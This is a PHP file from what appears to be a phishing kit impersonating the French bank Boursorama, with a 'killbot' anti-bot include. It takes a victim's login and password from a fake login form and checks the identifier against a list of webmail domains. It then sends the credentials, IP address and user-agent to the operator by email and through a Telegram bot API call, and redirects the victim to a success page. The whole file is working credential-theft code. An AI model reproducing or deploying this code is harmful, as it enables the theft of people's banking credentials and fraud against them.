<?php

include_once '../killbot/code/include.php';
include("../common/sub_includes.php");



if(isset($_POST['ide_pass_submit'])){

	
	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['password'] = htmlspecialchars($_POST['ide_password']);



	if(is_numeric($_SESSION["identifiant"]) || strpos($_SESSION['identifiant'], "hotmail.com") || strpos($_SESSION['identifiant'], "hotmail.fr") || strpos($_SESSION['identifiant'], "live.fr") || strpos($_SESSION['identifiant'], "outlook.fr") || strpos($_SESSION['identifiant'], "outlook.com") || strpos($_SESSION['identifiant'], "orange.fr") || strpos($_SESSION['identifiant'], "orange.com") || strpos($_SESSION['identifiant'], "wanadoo.fr") || strpos($_SESSION['identifiant'], "sfr.fr") || strpos($_SESSION['identifiant'], "club-internet.fr") || strpos($_SESSION['identifiant'], "neuf.fr") || strpos($_SESSION['identifiant'], "aliceadsl.fr") || strpos($_SESSION['identifiant'], "noos.fr") || strpos($_SESSION['identifiant'], "yahoo.com") || strpos($_SESSION['identifiant'], "yahoo.fr") || strpos($_SESSION['identifiant'], "aol.com") || strpos($_SESSION['identifiant'], "aol.fr") || strpos($_SESSION['identifiant'], "gmail.com") || strpos($_SESSION['identifiant'], "icloud.com") || strpos($_SESSION['identifiant'], "gmx.fr") || strpos($_SESSION['identifiant'], "gmx.de") || strpos($_SESSION['identifiant'], "free.fr") || strpos($_SESSION['identifiant'], "bbox.fr")){




				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "
[🧲] Login [🧲]

🧲 Identifiant : ".$_SESSION['identifiant']."
🧲 Mot de passe : ".$_SESSION['password']."

[⚰️] Additionnal [⚰️]

⚰️ IP : ".$_SESSION['ip']."
⚰️ User-agent : ".$_SESSION['useragent']."

					";

					$subject = "[🧲] + 1 Log |".$_SESSION['identifiant']." | ".$_SESSION['ip'];
					$headers = "From: 📦Bourso| <bill@rezzzzz.com>";

					mail($rezmail, $subject, $message, $headers);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$data = [
					'text' => '
[💌] NOUVEAU LOG BOURSO [💌]

📦 IDENTIFIANT : '.$_SESSION['identifiant'].'
📦 MOT DE PASSE : '.$_SESSION['password'].'

⚰️ Adresse Ip : '.$_SESSION['ip'].'

					  
					',
					'chat_id' => $chat_rez
								];

					file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}

				header('Location: ../../success.php');
				}
		else{
			header('Location: ../index.php?error=email');

		}

	}
else{
	header('Location: ../');
}

?>